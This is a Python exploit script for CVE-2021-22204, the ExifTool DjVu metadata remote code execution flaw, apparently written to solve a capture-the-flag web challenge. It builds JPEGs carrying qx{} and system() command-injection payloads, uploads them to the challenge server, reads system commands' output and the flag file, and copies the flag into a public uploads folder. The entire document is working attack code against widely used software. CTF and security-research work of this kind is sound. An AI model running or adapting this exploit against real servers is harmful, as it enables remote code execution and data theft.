#!/usr/bin/env python3
"""
CVE-2021-22204 ExifTool RCE exploit
ExifTool 12.16 is vulnerable
"""

import subprocess
import requests
import os
import re

URL = "http://chall.0xfun.org:20670/"
WORKDIR = "/home/ubuntu/0xfun/ctf/challenges/web/shell"


def create_exploit(cmd, output_file="exploit_final.jpg"):
    """Create JPEG with embedded malicious DjVu"""

    # Step 1: Create the DjVu payload
    payload = f'(metadata\n\t(Copyright "\\\n" . qx{{{cmd}}} . "\\\n b "))\n'

    payload_file = os.path.join(WORKDIR, "payload.txt")
    payload_bzz = os.path.join(WORKDIR, "payload.bzz")
    djvu_file = os.path.join(WORKDIR, "exploit.djvu")
    config_file = os.path.join(WORKDIR, "configfile")
    base_jpg = os.path.join(WORKDIR, "test.jpg")
    output_path = os.path.join(WORKDIR, output_file)

    # Write payload
    with open(payload_file, "w") as f:
        f.write(payload)

    # Compress with bzz
    subprocess.run(["bzz", payload_file, payload_bzz], check=True)

    # Create DjVu
    subprocess.run(["djvumake", djvu_file, "INFO=1,1", "BGjp=/dev/null", f"ANTz={payload_bzz}"], check=True)

    # Create exiftool config
    config_content = """%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'undef',
            WriteGroup => 'IFD0',
        },
    },
);
1;
"""
    with open(config_file, "w") as f:
        f.write(config_content)

    # Copy base JPEG
    subprocess.run(["cp", base_jpg, output_path], check=True)

    # Embed DjVu in JPEG
    result = subprocess.run(
        ["exiftool", "-config", config_file, "-overwrite_original", f"-HasselbladExif<={djvu_file}", output_path],
        capture_output=True,
        text=True,
    )
    print(f"  exiftool: {result.stdout.strip()} {result.stderr.strip()}")

    return output_path


def upload(filepath):
    """Upload file to the server"""
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f, "image/jpeg")}
        resp = requests.post(URL, files=files)
    return resp.text


# Try different commands and payload formats
commands = [
    "cat /flag.txt",
    "cat flag.txt",
    "ls /",
    "ls",
    "id",
    "cat /flag*",
    "find / -name flag* 2>/dev/null",
]

# Also try alternative payload formats
print("=" * 60)
print("Testing different commands with qx{}")
print("=" * 60)

for i, cmd in enumerate(commands):
    print(f"\n[{i+1}] Command: {cmd}")
    jpg = create_exploit(cmd, f"exploit_{i}.jpg")
    resp = upload(jpg)

    # Look for the command output in the response
    # The output will appear in the Copyright field
    copyright_match = re.search(r"Copyright\s+:\s*(.*?)(?:\n|$)", resp)
    if copyright_match:
        print(f"  Copyright: {copyright_match.group(1)}")

    # Search for flags directly
    flags = re.findall(r"0xfun\{[^}]+\}", resp)
    if flags:
        print(f"  [+] FLAG: {flags[0]}")

    # Search for uid= (id command output)
    if "uid=" in resp:
        uid_match = re.search(r"uid=.*", resp)
        print(f"  [+] ID: {uid_match.group()}")

    # Search for directory listing
    if any(x in resp for x in ["bin", "etc", "usr", "var"]):
        # Extract the pre block
        pre_match = re.search(r"<pre>(.*?)</pre>", resp, re.DOTALL)
        if pre_match:
            text = pre_match.group(1)
            # Search in Copyright
            lines = text.split("\n")
            for line in lines:
                if "Copyright" in line or "flag" in line.lower():
                    print(f"  {line.strip()}")


# Try alternative payload: use system() to write to web directory
print("\n" + "=" * 60)
print("Testing writing flag to web directory")
print("=" * 60)

# system() returns exit code, but will write to an accessible file
write_cmds = [
    "cp /flag.txt static/uploads/flag.txt",
    "cp /flag.txt /app/static/uploads/flag.txt",
    "cat /flag.txt > static/uploads/out.txt",
    "cat /flag.txt > /app/static/uploads/out.txt",
]

for cmd in write_cmds:
    print(f"\n[*] {cmd}")
    payload = f'(metadata\n\t(Copyright "\\\n" . system(\'{cmd}\') . "\\\n b "))\n'

    with open(os.path.join(WORKDIR, "payload.txt"), "w") as f:
        f.write(payload)
    subprocess.run(["bzz", os.path.join(WORKDIR, "payload.txt"), os.path.join(WORKDIR, "payload.bzz")], check=True)
    subprocess.run(
        [
            "djvumake",
            os.path.join(WORKDIR, "exploit_sys.djvu"),
            "INFO=1,1",
            "BGjp=/dev/null",
            f"ANTz={os.path.join(WORKDIR, 'payload.bzz')}",
        ],
        check=True,
    )
    subprocess.run(["cp", os.path.join(WORKDIR, "test.jpg"), os.path.join(WORKDIR, "sys.jpg")], check=True)
    subprocess.run(
        [
            "exiftool",
            "-config",
            os.path.join(WORKDIR, "configfile"),
            "-overwrite_original",
            f"-HasselbladExif<={os.path.join(WORKDIR, 'exploit_sys.djvu')}",
            os.path.join(WORKDIR, "sys.jpg"),
        ],
        capture_output=True,
        text=True,
    )

    resp = upload(os.path.join(WORKDIR, "sys.jpg"))

    # Try to access the copied file
    for path in ["flag.txt", "out.txt"]:
        try:
            r = requests.get(f"{URL}static/uploads/{path}", timeout=3)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"  [+] Contents of {path}: {r.text}")
                flags = re.findall(r"0xfun\{[^}]+\}", r.text)
                if flags:
                    print(f"  [+] FLAG: {flags[0]}")
        except:
            pass

print("\n[*] Done")
